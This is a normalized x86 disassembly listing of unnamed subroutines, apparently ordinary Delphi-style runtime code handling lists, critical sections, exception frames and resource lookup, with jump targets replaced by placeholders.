add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
sub_412404
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405cfc
pop edi
pop esi
pop ebx
retn
sub_41242c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ce0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412454
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d04
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41254c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413860
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403304
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403304
test al al
je r-xdata
sub_4125ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41254c
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41254c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403304
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41261c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4030c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413704
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_412698
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
mov eax [ esi + 0x4 ]
call sub_4030f0
mov eax [ esi + 0x8 ]
call sub_4030f0
mov eax [ esi + 0xc ]
call sub_4030f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4126d8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413860
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403054
test al al
jne r-xdata
sub_412738
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413860
mov edx eax
mov eax ebp
call sub_403304
test al al
jne r-xdata
sub_41277c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412817
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403040
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404110
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4126d8
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41281e
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
sub_41283c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404ea0
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_41285c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413860
mov edx edi
call sub_41283c
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413860
mov edx edi
call sub_41283c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413750
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41283c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413750
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412900
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413860
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412738
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41294c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41261c
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413704
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4129c0
push ebx
push esi
push edi
push ebp
call sub_403464
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413860
call sub_4030f0
inc edi
dec ebp
jne r-xdata
sub_412a1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413860
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4125ac
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412a60
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4126d8
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413860
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412aa4
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412b27
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403040
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b2e
lea eax [ ebp - 0x10c ]
call sub_403eac
retn
sub_412b34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412a1c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412540
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412aa4
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413860
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413860
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403304
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412a1c
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413750
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413704
sub_412c20
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413860
mov edx ebp
call sub_412824
test al al
jne r-xdata
sub_412c64
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41261c
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413704
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413860
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4138bc
test eax eax
jge r-xdata
sub_412cc0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413860
mov esi eax
mov edx ebp
mov eax esi
call sub_41285c
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4030f0
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413750
sub_412d10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_412e0f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e16
mov eax [ rw-data ]
call sub_412cb4
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413704
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413860
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412738
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413704
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413860
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412e16
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_412e3c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_412e6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412bfc
xor edx edx
push ebp
push sub_412ee3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403910
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413860
mov edx [ ebp - 0x4 ]
call sub_4126d8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412f00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_412f60
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f67
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_412f6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_412fb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412a60
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412fb9
mov eax [ rw-data ]
call sub_412cb4
retn
sub_412fc0
push ebx
push esi
mov esi eax
mov eax esi
call sub_412f6c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_412f00
sub_412fe0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_413045
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412c20
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412c08
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41304c
mov eax [ rw-data ]
call sub_412cb4
retn
mov eax ebx
call sub_40307c
mov ebx eax
sub_413050
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_413092
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412cc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413099
mov eax [ rw-data ]
call sub_412cb4
retn
sub_41309c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_4130de
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412c64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130e5
mov eax [ rw-data ]
call sub_412cb4
retn
sub_4130e8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_41312f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413136
mov eax [ rw-data ]
call sub_412cb4
retn
sub_41313c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412bfc
xor eax eax
push ebp
push sub_41318a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413191
mov eax [ rw-data ]
call sub_412cb4
retn
sub_4131f0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
pop ebp
retn 0x8
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_413228
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4131f0
mov edx eax
mov eax [ rw-data ]
call sub_413b9c
pop edi
pop esi
pop ebx
retn
sub_413254
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor edx edx
push ebp
push sub_4132be
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_413860
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403910
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4132d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407ab0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413310
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f00
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413354
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4138bc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413704
sub_4133ac
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413860
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4133ec
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4133ac
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413410
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40436c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413484
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415c34
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_413494
push ebx
call sub_405c18
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405c18
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413704
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov ebx eax
call sub_405c18
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov ebx eax
call sub_405c18
mov [ eax + 0xc ] ebx
sub_4134ec
push ebx
push esi
push edi
call sub_405c18
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413860
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41351c
push ebx
push esi
call sub_405c18
mov eax [ eax + 0x8 ]
call sub_4030f0
call sub_405c18
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413948
mov esi eax
call sub_405c18
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413750
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405c18
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4030f0
sub_413578
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41360e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413615
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40307c
call sub_413578
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403040
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404110
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404ec8
call sub_404f18
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413410
or bl al
sub_413620
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4136ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4136af
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403038
call sub_413578
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413494
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136b6
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4134ec
retn
